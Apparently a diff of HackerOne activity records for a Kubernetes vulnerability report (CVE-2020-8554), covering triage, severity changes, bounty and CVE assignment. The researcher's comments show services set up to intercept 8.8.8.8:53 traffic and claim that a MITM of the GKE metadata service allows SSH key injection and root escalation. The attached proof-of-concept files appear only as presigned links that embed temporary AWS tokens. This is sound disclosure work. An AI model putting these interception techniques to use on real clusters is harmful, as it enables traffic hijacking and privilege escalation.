+      "id": 6727758,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugTriaged",
+      "message": "Thank you @champtar! I was able to validate your report, and have submitted it to the appropriate remediation team for review. You will be updated on the status of this report as soon as there is additional information to share. Please note that the status and severity are subject to change.",
+      "automated_response": false,
+      "created_at": "2020-01-09T15:14:37.420Z",
+      "updated_at": "2020-01-09T15:14:37.420Z",
+      "actor": {
+        "username": "h1_analyst_leon",
+        "cleared": false,
+        "verified": false,
+        "url": "/h1_analyst_leon",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/9G6pgB95of3ikt3prqQunAfD/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 6731013,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportSeverityUpdated",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2020-01-09T21:18:16.377Z",
+      "updated_at": "2020-01-09T21:18:16.377Z",
+      "additional_data": {
+        "old_severity": "High",
+        "new_severity": "Medium (5.7)",
+        "old_severity_id": 596657,
+        "new_severity_id": 604131
+      },
+      "actor": {
+        "username": "h1_analyst_leon",
+        "cleared": false,
+        "verified": false,
+        "url": "/h1_analyst_leon",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/9G6pgB95of3ikt3prqQunAfD/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 6731030,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportSeverityUpdated",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2020-01-09T21:21:29.436Z",
+      "updated_at": "2020-01-09T21:21:29.436Z",
+      "additional_data": {
+        "old_severity": "Medium (5.7)",
+        "new_severity": "Medium (6.6)",
+        "old_severity_id": 604131,
+        "new_severity_id": 604132
+      },
+      "actor": {
+        "username": "h1_analyst_leon",
+        "cleared": false,
+        "verified": false,
+        "url": "/h1_analyst_leon",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/9G6pgB95of3ikt3prqQunAfD/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 6805232,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hello,\n\nOne more tests, as of k8s 1.16.3, there is nothing that prevent having an IP:port as both LoadBalancer and externalIP\n```\n# kubectl get svc -n kubeproxy-mitm \nNAME                    TYPE           CLUSTER-IP      EXTERNAL-IP   PORT(S)        AGE\nmitm-external-eip-dns   ClusterIP      10.233.55.182   8.8.8.8       53/UDP         4m10s\nmitm-external-lb-dns    LoadBalancer   10.233.35.158   8.8.8.8       53:31303/UDP   64s\n```\n(here 8.8.8.8:53)\n\nOn my IPVS cluster this just leads to requests timeouts (so DOS) when both mitm service are enabled at the same time.\n\nIdeally externalIPs and LoadBalancer should be handled with the same code / firewall rules as it's the same feature in the end. ",
+      "automated_response": false,
+      "created_at": "2020-01-18T04:05:55.723Z",
+      "updated_at": "2020-01-18T04:05:55.723Z",
+      "actor": {
+        "username": "champtar",
+        "cleared": false,
+        "verified": false,
+        "url": "/champtar",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/gP6rmwtVzj4iV6taRZdmhSGU/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 6805381,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "You can also have duplicates LB\n```\n# kubectl get svc -n kubeproxy-mitm\nNAME                    TYPE           CLUSTER-IP      EXTERNAL-IP   PORT(S)        AGE\nmitm-external-lb-dns1   LoadBalancer   10.233.47.145   8.8.8.8       53:31545/UDP   4m37s\nmitm-external-lb-dns2   LoadBalancer   10.233.40.23    8.8.8.8       53:31556/UDP   4m37s\nmitm-external-lb-dns3   LoadBalancer   10.233.28.107   8.8.8.8       53:31206/UDP   4m37s\n```\nHere all the LB are to 8.8.8.8:udp53\n\nI haven't looked at the code, but the LB that wins is not deterministic (I suspect there is not sorting)\nOn GKE it seems to work, and timeout with IPVS\n=> this might allow you to get 100% of the (unencrypted?) ingress traffic for this LB instead of the normal pods",
+      "automated_response": false,
+      "created_at": "2020-01-18T05:42:06.050Z",
+      "updated_at": "2020-01-18T05:42:06.050Z",
+      "actor": {
+        "username": "champtar",
+        "cleared": false,
+        "verified": false,
+        "url": "/champtar",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/gP6rmwtVzj4iV6taRZdmhSGU/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 6876796,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hello,\n\nJust curious is there already a CVE number for this bug report ?",
+      "automated_response": false,
+      "created_at": "2020-01-27T03:57:20.507Z",
+      "updated_at": "2020-01-27T03:57:20.507Z",
+      "actor": {
+        "username": "champtar",
+        "cleared": false,
+        "verified": false,
+        "url": "/champtar",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/gP6rmwtVzj4iV6taRZdmhSGU/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 6955321,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @champtar, thanks for the report. Sorry for the delayed response, we're still working out the kinks with our response process. We don't have a CVE reserved for this yet, but we're following up internally and will let you know once we have an update in the next couple of days.",
+      "automated_response": false,
+      "created_at": "2020-02-04T01:39:06.885Z",
+      "updated_at": "2020-02-04T01:39:06.885Z",
+      "actor": {
+        "username": "tallclair",
+        "cleared": false,
+        "verified": false,
+        "url": "/tallclair",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/418/594/6bbb78252759e1d1c1d67be48b7d7470926730de_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 7212740,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @tallclair, any news ? It's been a good couple of days :)",
+      "automated_response": false,
+      "created_at": "2020-03-04T01:22:59.016Z",
+      "updated_at": "2020-03-04T01:22:59.016Z",
+      "actor": {
+        "username": "champtar",
+        "cleared": false,
+        "verified": false,
+        "url": "/champtar",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/gP6rmwtVzj4iV6taRZdmhSGU/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 7212772,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BountyAwarded",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2020-03-04T01:35:57.944Z",
+      "updated_at": "2020-03-04T01:35:57.944Z",
+      "actor": {
+        "url": "/kubernetes",
+        "ibb": false,
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/039/386/486f4380e09776d05a912ca9f46be23f72fe8197_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "profile": {
+          "name": "Kubernetes"
+        }
+      },
+      "bounty_currency": "usd",
+      "genius_execution_id": null,
+      "team_handle": "kubernetes",
+      "collaborator": {
+        "username": "champtar",
+        "url": "/champtar"
+      }
+    },
+    {
+      "id": 7212773,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "This is a long standing design flaw, and probably won't be fixable without some user facing changes. We're still discussing how we want to handle it.",
+      "automated_response": false,
+      "created_at": "2020-03-04T01:36:56.623Z",
+      "updated_at": "2020-03-04T01:36:56.623Z",
+      "actor": {
+        "username": "tallclair",
+        "cleared": false,
+        "verified": false,
+        "url": "/tallclair",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/418/594/6bbb78252759e1d1c1d67be48b7d7470926730de_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 7212784,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::CveIdAdded",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2020-03-04T01:41:01.354Z",
+      "updated_at": "2020-03-04T01:41:01.354Z",
+      "cve_ids": [
+        "CVE-2020-8554"
+      ],
+      "actor": {
+        "username": "tallclair",
+        "cleared": false,
+        "verified": false,
+        "url": "/tallclair",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/418/594/6bbb78252759e1d1c1d67be48b7d7470926730de_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 7212786,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "CVE-2020-8554 has been reserved for this issue",
+      "automated_response": false,
+      "created_at": "2020-03-04T01:41:41.376Z",
+      "updated_at": "2020-03-04T01:41:41.376Z",
+      "actor": {
+        "username": "tallclair",
+        "cleared": false,
+        "verified": false,
+        "url": "/tallclair",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/418/594/6bbb78252759e1d1c1d67be48b7d7470926730de_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 7213240,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Thanks !\nBeing able to talk to a LoadBalancer IP is a feature, so indeed the only fix that I see is some dynamic whitelist for the IP ranges allowed for LoadBalancer IPs and ExternalIPs, and give permission to the LoadBalancer controllers to update this whitelist.\nBefore I forget, for the attribution can you put \"Etienne Champetier of Anevia\" ?\nGood luck !",
+      "automated_response": false,
+      "created_at": "2020-03-04T04:10:52.563Z",
+      "updated_at": "2020-03-04T04:10:52.563Z",
+      "actor": {
+        "username": "champtar",
+        "cleared": false,
+        "verified": false,
+        "url": "/champtar",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/gP6rmwtVzj4iV6taRZdmhSGU/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 7227395,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Thanks, I've made a note in our internal tracker for the attribution.",
+      "automated_response": false,
+      "created_at": "2020-03-04T18:00:07.087Z",
+      "updated_at": "2020-03-04T18:00:07.087Z",
+      "actor": {
+        "username": "tallclair",
+        "cleared": false,
+        "verified": false,
+        "url": "/tallclair",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/418/594/6bbb78252759e1d1c1d67be48b7d7470926730de_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 7534723,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hello @tallclair \nAny news on this issue ?\nI don't intend to disclose but it's been a good 90days since initial report ;)",
+      "automated_response": false,
+      "created_at": "2020-04-03T22:38:27.318Z",
+      "updated_at": "2020-04-03T22:38:27.318Z",
+      "actor": {
+        "username": "champtar",
+        "cleared": false,
+        "verified": false,
+        "url": "/champtar",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/gP6rmwtVzj4iV6taRZdmhSGU/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 7577317,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "@champtar  We've had some internal discussions with members of the Kubernetes project about how to proceed. I missed the last meeting where it was discussed, so I'm not sure what our plan is at this point. I'll see if I can get more info for you. ",
+      "automated_response": false,
+      "created_at": "2020-04-07T20:07:20.141Z",
+      "updated_at": "2020-04-07T20:07:20.141Z",
+      "actor": {
+        "username": "jk1joel",
+        "cleared": false,
+        "verified": false,
+        "url": "/jk1joel",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 8013228,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @jk1joel @tallclair \nHope you are still doing good.\n\nI've been contributing to MetalLB lately so I'm wondering if there will be some needed changes for LoadBalancers implementation to fix this issue.",
+      "automated_response": false,
+      "created_at": "2020-05-15T16:15:36.764Z",
+      "updated_at": "2020-05-15T16:15:36.764Z",
+      "actor": {
+        "username": "champtar",
+        "cleared": false,
+        "verified": false,
+        "url": "/champtar",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/gP6rmwtVzj4iV6taRZdmhSGU/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 8226678,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "@jk1joel @tallclair small update, on GKE, doing a MITM of the http metadata service (169.254.169.254) allow to inject ssh keys, thus allowing root privilege escalation !! (I have a working POC, just need to clean it up)\nI haven't had time to test other cloud providers, but I believe most of them use similar metadata mechanism (openstack included).",
+      "automated_response": false,
+      "created_at": "2020-06-08T03:13:15.788Z",
+      "updated_at": "2020-06-08T03:13:15.788Z",
+      "actor": {
+        "username": "champtar",
+        "cleared": false,
+        "verified": false,
+        "url": "/champtar",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/gP6rmwtVzj4iV6taRZdmhSGU/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 8248501,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Thanks for the update, @champtar, I'd be very interested in seeing that POC. You may want to try Google's VRP too: https://www.google.com/about/appsecurity/reward-program/\n\nOn our end, we have a meeting coming up to make a decision about how to proceed with this, so I'll be able to provide more concrete information about what we're doing / how we're handling this soon. Thanks for your patience!",
+      "automated_response": false,
+      "created_at": "2020-06-10T00:03:48.099Z",
+      "updated_at": "2020-06-10T00:03:48.099Z",
+      "actor": {
+        "username": "tallclair",
+        "cleared": false,
+        "verified": false,
+        "url": "/tallclair",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/418/594/6bbb78252759e1d1c1d67be48b7d7470926730de_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 8268162,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "@tallclair https://issuetracker.google.com/158721931\nElse here are the files:\nF864738\nF864737\nF864739\nF864740",
+      "automated_response": false,
+      "created_at": "2020-06-11T22:20:08.364Z",
+      "updated_at": "2020-06-11T22:20:08.364Z",
+      "actor": {
+        "username": "champtar",
+        "cleared": false,
+        "verified": false,
+        "url": "/champtar",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/gP6rmwtVzj4iV6taRZdmhSGU/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "attachments": [
+        {
+          "id": 864740,
+          "filename": "go.sum",
+          "type": "application/octet-stream",
+          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/1HF4MbGyEsqkCyk4qQXANi6Z?response-content-disposition=attachment%3B%20filename%3D%22go.sum%22%3B%20filename%2A%3DUTF-8%27%27go.sum&response-content-type=application%2Foctet-stream&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWUGJSEXW%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070752Z&X-Amz-Expires=1322&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIQCs%2BAHUbCDN7ZM%2FRhBNF28O2F80UhXY6VtR8FvK0GbHCgIgT%2BHvom8NbOL5HpmSclupqcewRsIHOtWesqOwPyb3C5wqsgUIIxADGgwwMTM2MTkyNzQ4NDkiDFiBp%2B1%2BzPYJYiKWkCqPBcubQSUuQMPeeQa917%2BsMAQCzVw%2BNeT6L8eSgPDCNtgxYe8nYbmd3bljfIC3gl3bvM4o5m%2BR%2B5RRf3jBkEj%2BW%2BSfQSsJ1t8qEL1DJhE%2BvQvaH5ZuAs%2Fdx71s%2BsyOYaurHYRzsywB%2FL1i79fR9W5NUUYb9DJP3l3IGwCvhoNXq5H9mao8oGqlQIUQpegksD8zGG7uHqbOR5vyJqjS2wezOXyVBRjqiKWx0uMZU3A%2FeowGBQXtyY%2FIWdY3s00Twmdd9K2LrlTYw%2Fq2ftpeRtw%2Fn6VvYA6QvmYjr4ZK4JQ9RtYItF8kqbeUb19T3r9c1BFd%2Flbj0Y93xziXJ0xw10GDor0lUx1K4OS7yl9A%2Blu8ufd7MEdEy5s%2Fb0XY2gKYgjf3bY8QRGay30L3L42RcYMf3nqFXO7X3T1N8KfU%2FEJ6c%2F0Yh3bz5yjyaOFQ1cpGT8FGzJlBLHOMB8K6GdzC8tTq4pubY1TR8VnEYZnWk469DzZN%2FeC5qF7sUIW6uWIoiJ19UdSfmZ3xCCwnvklPoVeSaksq3JGhl6AKJbJ7cpUX6owVSnjSmLgCyoYJwLnhMsClgfM0126PpfYlelVGHEqacfBJmkI98B9aLbw2Rygpr1c9BZn9lpNURRanA4YamBuyRTY1JryY6807dLLK0V%2BBeikUHYUT9bZWaBeObgiEIzueZxMFdg5O%2F4nPH2PYDDfg%2BCuXmM3SPrsHkedvAu%2Bvt8yI9uTGk3DR4nJJ4TI0FHy0Ibc7OB7Hxz9nuY3peFIeGYbVJO7C3z1Nov6vn8I5jhwgFpB8ZYg6F%2F3%2FMD620wePaHv%2Fp5lGNzOcnQtX5lywxAbgNX2IcOSHijZYISJeuH2n8sh4PLW7PyKQrJUXn3Yw3P24qAY6sQGsyp%2FD97WbhPz5ULuCT2FvDBvfHDbIte5V4gLDv6VQbMsQ%2Fng51ukrSyWVufY5hEkCq9Ao4dGfEh3jBy0Uz7N9VzK9vaAGEEBIO5d0qqm9xxaX0jdUAw9Yapvhd4z7AUfapQhytkyw5%2BB2KUq%2BWaZrN4Ii3L9QfffPDPLtzj0aFCcjy1Gvz4BqiwFMa7vwGaRcwK%2FB4KzhT0sRLNUsk9KS7rpcPkfB2yVzUcgtyiDV64Y%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=18b4a59132755e73c1272168c33f3b34dc6dfdcd971323edb6f3c10047808351"
+        },
+        {
+          "id": 864739,
+          "filename": "go.mod",
+          "type": "audio/x-mod",
+          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/Fr6ht8GD5kqi3QwSDrmr2UMJ?response-content-disposition=attachment%3B%20filename%3D%22go.mod%22%3B%20filename%2A%3DUTF-8%27%27go.mod&response-content-type=audio%2Fx-mod&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWUGJSEXW%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070752Z&X-Amz-Expires=1322&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIQCs%2BAHUbCDN7ZM%2FRhBNF28O2F80UhXY6VtR8FvK0GbHCgIgT%2BHvom8NbOL5HpmSclupqcewRsIHOtWesqOwPyb3C5wqsgUIIxADGgwwMTM2MTkyNzQ4NDkiDFiBp%2B1%2BzPYJYiKWkCqPBcubQSUuQMPeeQa917%2BsMAQCzVw%2BNeT6L8eSgPDCNtgxYe8nYbmd3bljfIC3gl3bvM4o5m%2BR%2B5RRf3jBkEj%2BW%2BSfQSsJ1t8qEL1DJhE%2BvQvaH5ZuAs%2Fdx71s%2BsyOYaurHYRzsywB%2FL1i79fR9W5NUUYb9DJP3l3IGwCvhoNXq5H9mao8oGqlQIUQpegksD8zGG7uHqbOR5vyJqjS2wezOXyVBRjqiKWx0uMZU3A%2FeowGBQXtyY%2FIWdY3s00Twmdd9K2LrlTYw%2Fq2ftpeRtw%2Fn6VvYA6QvmYjr4ZK4JQ9RtYItF8kqbeUb19T3r9c1BFd%2Flbj0Y93xziXJ0xw10GDor0lUx1K4OS7yl9A%2Blu8ufd7MEdEy5s%2Fb0XY2gKYgjf3bY8QRGay30L3L42RcYMf3nqFXO7X3T1N8KfU%2FEJ6c%2F0Yh3bz5yjyaOFQ1cpGT8FGzJlBLHOMB8K6GdzC8tTq4pubY1TR8VnEYZnWk469DzZN%2FeC5qF7sUIW6uWIoiJ19UdSfmZ3xCCwnvklPoVeSaksq3JGhl6AKJbJ7cpUX6owVSnjSmLgCyoYJwLnhMsClgfM0126PpfYlelVGHEqacfBJmkI98B9aLbw2Rygpr1c9BZn9lpNURRanA4YamBuyRTY1JryY6807dLLK0V%2BBeikUHYUT9bZWaBeObgiEIzueZxMFdg5O%2F4nPH2PYDDfg%2BCuXmM3SPrsHkedvAu%2Bvt8yI9uTGk3DR4nJJ4TI0FHy0Ibc7OB7Hxz9nuY3peFIeGYbVJO7C3z1Nov6vn8I5jhwgFpB8ZYg6F%2F3%2FMD620wePaHv%2Fp5lGNzOcnQtX5lywxAbgNX2IcOSHijZYISJeuH2n8sh4PLW7PyKQrJUXn3Yw3P24qAY6sQGsyp%2FD97WbhPz5ULuCT2FvDBvfHDbIte5V4gLDv6VQbMsQ%2Fng51ukrSyWVufY5hEkCq9Ao4dGfEh3jBy0Uz7N9VzK9vaAGEEBIO5d0qqm9xxaX0jdUAw9Yapvhd4z7AUfapQhytkyw5%2BB2KUq%2BWaZrN4Ii3L9QfffPDPLtzj0aFCcjy1Gvz4BqiwFMa7vwGaRcwK%2FB4KzhT0sRLNUsk9KS7rpcPkfB2yVzUcgtyiDV64Y%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=84dcd37fcbe815b0d74eabf83f6ab3f5280407c31a35ab0e0ab6325ff2c312b6"
+        },
+        {
+          "id": 864738,
+          "filename": "instructions.txt",
+          "type": "text/plain",
+          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/WEAX7kBcqmkwFxgoiHD6xpXY?response-content-disposition=attachment%3B%20filename%3D%22instructions.txt%22%3B%20filename%2A%3DUTF-8%27%27instructions.txt&response-content-type=text%2Fplain&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWUGJSEXW%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070752Z&X-Amz-Expires=1322&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIQCs%2BAHUbCDN7ZM%2FRhBNF28O2F80UhXY6VtR8FvK0GbHCgIgT%2BHvom8NbOL5HpmSclupqcewRsIHOtWesqOwPyb3C5wqsgUIIxADGgwwMTM2MTkyNzQ4NDkiDFiBp%2B1%2BzPYJYiKWkCqPBcubQSUuQMPeeQa917%2BsMAQCzVw%2BNeT6L8eSgPDCNtgxYe8nYbmd3bljfIC3gl3bvM4o5m%2BR%2B5RRf3jBkEj%2BW%2BSfQSsJ1t8qEL1DJhE%2BvQvaH5ZuAs%2Fdx71s%2BsyOYaurHYRzsywB%2FL1i79fR9W5NUUYb9DJP3l3IGwCvhoNXq5H9mao8oGqlQIUQpegksD8zGG7uHqbOR5vyJqjS2wezOXyVBRjqiKWx0uMZU3A%2FeowGBQXtyY%2FIWdY3s00Twmdd9K2LrlTYw%2Fq2ftpeRtw%2Fn6VvYA6QvmYjr4ZK4JQ9RtYItF8kqbeUb19T3r9c1BFd%2Flbj0Y93xziXJ0xw10GDor0lUx1K4OS7yl9A%2Blu8ufd7MEdEy5s%2Fb0XY2gKYgjf3bY8QRGay30L3L42RcYMf3nqFXO7X3T1N8KfU%2FEJ6c%2F0Yh3bz5yjyaOFQ1cpGT8FGzJlBLHOMB8K6GdzC8tTq4pubY1TR8VnEYZnWk469DzZN%2FeC5qF7sUIW6uWIoiJ19UdSfmZ3xCCwnvklPoVeSaksq3JGhl6AKJbJ7cpUX6owVSnjSmLgCyoYJwLnhMsClgfM0126PpfYlelVGHEqacfBJmkI98B9aLbw2Rygpr1c9BZn9lpNURRanA4YamBuyRTY1JryY6807dLLK0V%2BBeikUHYUT9bZWaBeObgiEIzueZxMFdg5O%2F4nPH2PYDDfg%2BCuXmM3SPrsHkedvAu%2Bvt8yI9uTGk3DR4nJJ4TI0FHy0Ibc7OB7Hxz9nuY3peFIeGYbVJO7C3z1Nov6vn8I5jhwgFpB8ZYg6F%2F3%2FMD620wePaHv%2Fp5lGNzOcnQtX5lywxAbgNX2IcOSHijZYISJeuH2n8sh4PLW7PyKQrJUXn3Yw3P24qAY6sQGsyp%2FD97WbhPz5ULuCT2FvDBvfHDbIte5V4gLDv6VQbMsQ%2Fng51ukrSyWVufY5hEkCq9Ao4dGfEh3jBy0Uz7N9VzK9vaAGEEBIO5d0qqm9xxaX0jdUAw9Yapvhd4z7AUfapQhytkyw5%2BB2KUq%2BWaZrN4Ii3L9QfffPDPLtzj0aFCcjy1Gvz4BqiwFMa7vwGaRcwK%2FB4KzhT0sRLNUsk9KS7rpcPkfB2yVzUcgtyiDV64Y%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c26532045688a5413d09bb5ee484aa3fe1d346df312ea4a60e9aadec96df5100"
+        },
+        {
+          "id": 864737,
+          "filename": "metadatamitm.go",
+          "type": "text/x-go",
+          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/buXegZx1LXkbAvzd8SjcsrYy?response-content-disposition=attachment%3B%20filename%3D%22metadatamitm.go%22%3B%20filename%2A%3DUTF-8%27%27metadatamitm.go&response-content-type=text%2Fx-go&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWUGJSEXW%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070752Z&X-Amz-Expires=1322&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIQCs%2BAHUbCDN7ZM%2FRhBNF28O2F80UhXY6VtR8FvK0GbHCgIgT%2BHvom8NbOL5HpmSclupqcewRsIHOtWesqOwPyb3C5wqsgUIIxADGgwwMTM2MTkyNzQ4NDkiDFiBp%2B1%2BzPYJYiKWkCqPBcubQSUuQMPeeQa917%2BsMAQCzVw%2BNeT6L8eSgPDCNtgxYe8nYbmd3bljfIC3gl3bvM4o5m%2BR%2B5RRf3jBkEj%2BW%2BSfQSsJ1t8qEL1DJhE%2BvQvaH5ZuAs%2Fdx71s%2BsyOYaurHYRzsywB%2FL1i79fR9W5NUUYb9DJP3l3IGwCvhoNXq5H9mao8oGqlQIUQpegksD8zGG7uHqbOR5vyJqjS2wezOXyVBRjqiKWx0uMZU3A%2FeowGBQXtyY%2FIWdY3s00Twmdd9K2LrlTYw%2Fq2ftpeRtw%2Fn6VvYA6